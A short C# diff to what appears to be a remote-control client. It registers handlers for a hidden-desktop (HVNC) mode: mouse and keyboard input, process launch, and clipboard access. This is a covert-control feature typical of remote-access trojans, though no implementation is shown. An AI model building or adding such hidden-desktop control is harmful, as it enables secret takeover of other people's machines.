@@ -139,6 +139,16 @@ namespace RemoteControl.Client
             handlers.Add(ePacketType.PACKET_CLIPBOARD_GET_REQUEST, clipboardHandler);
             handlers.Add(ePacketType.PACKET_CLIPBOARD_SET_REQUEST, clipboardHandler);
             handlers.Add(ePacketType.PACKET_GET_WINDOWS_REQUEST, new RequestGetWindowsHandler());
+
+            // HVNC 隐形桌面
+            RequestHVNCHandler hvncHandler = new RequestHVNCHandler();
+            handlers.Add(ePacketType.PACKET_HVNC_START_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_STOP_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_CLIPBOARD_GET_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_CLIPBOARD_SET_REQUEST, hvncHandler);
         }
     }
 }
